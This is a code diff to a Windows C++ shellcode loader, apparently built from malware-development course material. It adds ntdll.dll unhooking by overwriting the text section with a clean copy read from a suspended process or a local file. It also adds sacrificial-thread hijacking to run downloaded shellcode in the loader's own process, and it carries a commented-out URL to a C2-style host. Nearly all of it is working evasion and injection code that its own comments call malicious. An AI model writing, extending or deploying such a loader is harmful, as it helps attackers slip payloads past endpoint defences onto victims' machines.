@@ -2,6 +2,7 @@
 #include <winhttp.h>
 #include <iostream>
 #include <vector>
+#include <winternl.h>
 
 #include "syscalls.h"
 
@@ -9,11 +10,15 @@
 
 #define DEBUGGING 0
 #define USEHTTP 0
+#define CLEANNTDLL 1
+
+// #define FIXED_URL "https://ghettoc2.net/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/ntdll.dll");
+#define FIXED_FILENAME "entee.dat";
 
 #define MAXSHELLCODESIZE 4096
 
 #define _CRT_SECURE_NO_DEPRECATE
-#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+//#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
 #pragma warning (disable : 4996)
 
@@ -118,6 +123,283 @@ BOOL checkup()
 
 }
 
+#if CLEANNTDLL == 1
+SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {
+
+	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
+
+	fprintf(stderr, "GetNtdllSizeFromBaseAddress\n");
+	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
+		fprintf(stderr, "GetNtdllSizeFromBaseAddress pImgDosHdr error\n");
+		return NULL;
+	}
+	
+	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
+		fprintf(stderr, "GetNtdllSizeFromBaseAddress pImgNtHdr error\n");
+		return NULL;
+	}
+	fprintf(stderr, "GetNtdllSizeFromBaseAddress done\n");
+
+	return pImgNtHdrs->OptionalHeader.SizeOfImage;
+}
+
+PVOID FetchLocalNtdllBaseAddress() {
+
+	PPEB pPeb = (PPEB)__readgsqword(0x60);
+
+	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'SuspendedProcessUnhooking.exe')
+	// 0x10 is = sizeof(LIST_ENTRY)
+	fprintf(stderr, "FetchLocalNtdllBaseAddress\n");
+	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
+	fprintf(stderr, "FetchLocalNtdllBaseAddress done\n");
+
+	return pLdr->DllBase;
+}
+
+BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
+
+	PVOID       pLocalNtdll      = (PVOID)FetchLocalNtdllBaseAddress();
+	NTSTATUS	ntstatus;
+	HANDLE		curProc = GetCurrentProcess();
+
+	fprintf(stderr, "ReplaceNtdllTxtSection\n");
+
+	// getting the dos header
+	PIMAGE_DOS_HEADER   pLocalDosHdr      = (PIMAGE_DOS_HEADER)pLocalNtdll;
+	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+		return FALSE;
+
+	// getting the nt headers
+	PIMAGE_NT_HEADERS   pLocalNtHdrs      = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
+	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+		return FALSE;
+
+
+	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
+			    pRemoteNtdllTxt  = NULL; // the unhooked text section base address
+	SIZE_T		sNtdllTxtSize	= NULL;	// the size of the text section
+
+
+	// getting the text section
+	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
+
+	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
+
+		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
+		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
+			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
+			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
+			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
+			break;
+		}
+	}
+
+//---------------------------------------------------------------------------------------------------------------------------
+	
+	// small check to verify that all the required information is retrieved
+	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize ) {
+		fprintf(stderr, "Not all required info found\n");
+		return FALSE;
+	}
+
+	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
+	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
+		fprintf(stderr, "Base address mismatch %llx - %llx\n", (unsigned __int64)pLocalNtdllTxt, (unsigned __int64)pRemoteNtdllTxt);
+		return FALSE;
+	}
+
+//---------------------------------------------------------------------------------------------------------------------------
+	
+	DWORD dwOldProtection = NULL;
+
+	// making the text section writable and executable
+//	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
+	ntstatus = NtProtectVirtualMemory(curProc, &pLocalNtdllTxt, &sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection);
+    if (!NT_SUCCESS(ntstatus)) {
+#if DEBUGGING == 1
+        fprintf(stderr, "NTDLL NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
+#endif
+		fprintf(stderr, "NTDLL NtProtectVirtualMemory (set) error, ntstatus is %lx\n", ntstatus);
+		return FALSE;
+    }
+
+	// copying the new text section 
+	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
+
+	// restoring the old memory protection
+//	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
+	ntstatus = NtProtectVirtualMemory(curProc, &pLocalNtdllTxt, &sNtdllTxtSize, dwOldProtection, &dwOldProtection);
+    if (!NT_SUCCESS(ntstatus)) {
+#if DEBUGGING == 1
+        fprintf(stderr, "NTDLL NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
+#endif
+		fprintf(stderr, "NTDLL NtProtectVirtualMemory (restore) error, ntstatus is %lx\n", ntstatus);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+// dummy function to use for the sacrificial thread we need to start our malicious shellcode
+VOID DummyFunction() {
+
+	// stupid code
+	int		j = rand();
+	int		i = j * j;
+
+}
+
+BOOL GetPayloadFromFile(char *szFilename, OUT PVOID* pNtdllBuffer, OUT PSIZE_T sNtdllSize) {
+
+	BOOL		bSTATE = TRUE;
+//	HINTERNET	hInternet = NULL, hInternetFile = NULL
+	FILE		*infile;
+	DWORD		dwBytesRead = NULL;
+	SIZE_T		sSize = NULL; 	 			// Used as the total size counter
+	PBYTE		pBytes = NULL,				// Used as the total heap buffer counter
+		        pTmpBytes = NULL;			// Used as the tmp buffer (of size 1024)
+
+/*
+// Opening the internet session handle, all arguments are NULL here since no proxy options are required
+	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
+	if (hInternet == NULL) {
+		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	// Opening the handle to the ntdll file using theURL
+	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	if (hInternetFile == NULL) {
+		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+*/
+	if ((infile = fopen(szFilename, "rb")) == NULL) {
+		fprintf(stderr, "Error reading file %s\n", szFilename);
+		return FALSE;
+	}
+
+	// Allocating 1024 bytes to the temp buffer
+	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (pTmpBytes == NULL) {
+		return FALSE;
+	}
+
+	while (TRUE) {
+		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
+		if ((dwBytesRead = fread(pTmpBytes, sizeof(char), 1024, infile)) == 0) {
+			if (ferror(infile)) {
+				fprintf(stderr, "File %s read error %d\n", szFilename, errno);
+				return FALSE;
+			}
+		}
+
+		// Calculating the total size of the total buffer 
+		sSize += dwBytesRead;
+
+		// In case the total buffer is not allocated yet
+		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
+		if (pBytes == NULL)
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+		else
+			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
+			// This is required in order to fit the whole ntdll file bytes
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+		if (pBytes == NULL) {
+			return FALSE;
+		}
+
+		// Append the temp buffer to the end of the total buffer
+		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+
+		// Clean up the temp buffer
+		memset(pTmpBytes, '\0', dwBytesRead);
+
+		// If less than 1024 bytes were read it means the end of the file was reached
+		// Therefore exit the loop 
+		if (dwBytesRead < 1024) {
+			break;
+		}
+
+		// Otherwise, read the next 1024 bytes
+	}
+	fclose(infile);
+
+
+	// Saving 
+	*pNtdllBuffer = pBytes;
+	*sNtdllSize = sSize;
+}
+
+BOOL ReadNtdllFromFile(char *szFilename, OUT PVOID* ppNtdllBuf) {
+
+	PBYTE      pNtdllModule = (PBYTE)FetchLocalNtdllBaseAddress();
+	PVOID      pNtdllBuffer = NULL;
+	SIZE_T     sNtdllSize = NULL;
+
+	// getting the dos header of the local ntdll image
+	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
+	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+		return NULL;
+
+	// getting the nt headers of the local ntdll image
+	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+		return NULL;
+
+	// 'GetPayloadFromFile' is used to read a local file
+	if (!GetPayloadFromFile(szFilename, &pNtdllBuffer, &sNtdllSize))
+		return FALSE;
+
+	// 'sNtdllSize' will now contain the size of the downloaded ntdll.dll file
+	// 'pNtdllBuffer' will now contain the base address of the downloaded ntdll.dll file
+
+	*ppNtdllBuf = pNtdllBuffer;
+
+	return TRUE;
+}
+
+
+BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload) {
+
+	CONTEXT		ThreadCtx;
+
+	fprintf(stderr, "RunViaClassicThreadHijacking with code at %llx\n", (unsigned __int64)pPayload);
+
+	ThreadCtx.ContextFlags = CONTEXT_ALL; // CONTEXT_CONTROL;
+
+	// Getting the original thread context
+	if (!GetThreadContext(hThread, &ThreadCtx)) {
+		fprintf(stderr, "[!] GetThreadContext Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	fprintf(stderr, "Got thread context\n");
+	fprintf(stderr, "Current RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);
+
+	// Updating the next instruction pointer to be equal to the payload's address 
+	ThreadCtx.Rip = (DWORD64) pPayload;
+
+	fprintf(stderr, "New RIP is %llx\n", (unsigned __int64)ThreadCtx.Rip);
+	getchar();
+
+	/*
+		- in case of a x64 payload injection : we change the value of `Rip`
+		- in case of a x32 payload injection : we change the value of `Eip`
+	*/
+
+	// setting the new updated thread context
+	if (!SetThreadContext(hThread, &ThreadCtx)) {
+		fprintf(stderr, "[!] SetThreadContext Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
+}
+#endif
+
 unsigned long temp;
 
 int main(int argc, char **argv)
@@ -160,7 +442,7 @@ int main(int argc, char **argv)
     LPVOID          start_address = NULL;
     SIZE_T          code_size;
     DWORD           oldProtect = NULL;
-	unsigned long shellcode_size;
+	volatile unsigned long shellcode_size;
 
 #if DEBUGGING == 1
     printf("Starting download\n");
@@ -203,6 +485,7 @@ int main(int argc, char **argv)
 #if DEBUGGING == 1
     printf("Shellcode size is %d\n", shellcode_size);
 #endif
+	fprintf(stderr, "0. Shellcode size is %d\n", shellcode_size);
 
 	if (shellcode_size == 0) {
 		fprintf(stderr, "Shellcode size is 0, error\n");
@@ -245,11 +528,79 @@ int main(int argc, char **argv)
     getchar();
 #endif
 
+#if CLEANNTDLL == 1
+	PVOID	pNtdllModule		= FetchLocalNtdllBaseAddress();
+	PBYTE	pNtdllBuffer		= NULL;
+	SIZE_T	sNtdllSize		    = NULL, sNumberOfBytesRead = NULL;
+	
+	fprintf(stderr, "[i] Fetching a clean \"ntdll.dll\" File From A Suspended Process, pid %d\n", GetProcessId(process_info->hProcess));
+
+	// allocating enough memory to read ntdll from the remote process
+	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
+	if (!sNtdllSize) {
+		fprintf(stderr, "GetNtdllSizeFromBaseAddress error\n");
+		exit(1);
+	}
+	pNtdllBuffer = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
+	if (!pNtdllBuffer) {
+		fprintf(stderr, "HeapAlloc error\n");
+		exit(1);
+	}
+
+	// reading a clean ntdll.dll
+	if (!ReadProcessMemory(process_info->hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
+		// Reading from memory fails
+		fprintf(stderr, "[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
+		fprintf(stderr, "[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllSize);
+		//exit(1);
+		// try from clean file...
+		char ntdllfile[MAX_PATH] = FIXED_FILENAME;
+
+		if (!ReadNtdllFromFile(ntdllfile, (PVOID *)pNtdllBuffer)) {
+			fprintf(stderr, "[!] ReadNtdllFromFile Failed with Error : %d \n", GetLastError());
+			exit(1);
+		}
+	}
+
+#if DEBUGGING == 1
+	fprintf(stderr, "ntdll read into buffer %lx\n", pNtDllBuffer);
+	getchar();
+#endif
+
+/*
+	if (!ReadNtdllFromASuspendedProcess("notepad.exe", &pNtdll))
+		return -1;
+*/
+
+	if (!ReplaceNtdllTxtSection(pNtdllBuffer)) {
+		fprintf(stderr, "ReplaceNtdllTxtSection failed\n");
+		exit(1);
+	}
+
+	//HeapFree(GetProcessHeap(), 0, pNtdll);
+
+#if DEBUGGING == 1
+	printf("[+] Ntdll Unhooked Successfully \n");
+	printf("Press <Enter> to continue ...");
+	getchar();
+#endif
+
+	// As we're cleaning our own NTDLL, we should also inject the shellcode in our own process, right?
+	// We don't need the suspended notepad anymore, get a handle to our current process
+	process_info->hProcess = GetCurrentProcess();
+
+#endif
+
+#if DEBUGGING == 1
+	fprintf(stderr, "Injecting shellcode into process %d\n", GetProcessId(process_info->hProcess));
+#endif
+	fprintf(stderr, "Injecting shellcode into process %d\n", GetProcessId(process_info->hProcess));
+
     // Allocate Virtual Memory
     code_size = (SIZE_T)shellcode_size;
-//	fprintf(stderr, "1.Shellcode size is %d\n", shellcode_size);
+	fprintf(stderr, "1.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
 	ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-//	fprintf(stderr, "1a.Shellcode size is %d\n", shellcode_size);
+	fprintf(stderr, "1a.Shellcode size is %d, code_size is %d\n", shellcode_size, code_size);
 	if (!NT_SUCCESS(ntstatus)) {
 #if DEBUGGING == 1
         fprintf(stderr, "NtAllocVirtualMemory error, ntstatus is %d\n", ntstatus);
@@ -348,9 +699,37 @@ int main(int argc, char **argv)
 #endif
     }
 
-	fprintf(stderr, "Memory protected, check with processhacker\n");
+	fprintf(stderr, "Memory protected at %llx, check with processhacker\n", (unsigned __int64)start_address);
 	getchar();
 
+#if CLEANNTDLL == 1
+	// As we are injecting in our own process QueueUserAPC won't work
+	// Create an innocent thread that and then replace it with our shellcode
+
+	HANDLE		hThread = NULL;
+	DWORD		dwThreadId = NULL;
+
+	// Creating sacrificial thread in suspended state 
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
+	if (hThread == NULL) {
+		fprintf(stderr, "[!] CreateThread Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	fprintf(stderr,"[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
+	// hijacking the sacrificial thread created, point it to our shellcode
+	if (!RunViaClassicThreadHijacking(hThread, (PBYTE)start_address)) {
+		fprintf(stderr, "ThreadHijack error\n");
+		return -1;
+	}
+	fprintf(stderr,"[+] DONE \n");
+	fprintf(stderr,"[#] Press <Enter> To Run The Payload ... ");
+	getchar();
+
+	// resuming suspended thread, so that it runs our shellcode
+	ResumeThread(hThread);
+	WaitForSingleObject(hThread, INFINITE);
+#else
     ntstatus = NtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
     if (!NT_SUCCESS(ntstatus)) {
 #if DEBUGGING == 1
@@ -379,10 +758,9 @@ int main(int argc, char **argv)
         fprintf(stderr, "Thread resumed\n");
 #endif
     }
-
-	fprintf(stderr, "Resumed\n");
+	fprintf(stderr, "Done\n");
 	getchar();
-
+#endif
     // close handles
     CloseHandle(process_info->hThread);
     CloseHandle(process_info->hProcess);
@@ -393,6 +771,7 @@ int main(int argc, char **argv)
     return 1;
 }
 
+#if USEHTTP == 1
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
 
     // initialise session
@@ -459,3 +838,4 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
 
     return buffer;
 }
+#endif
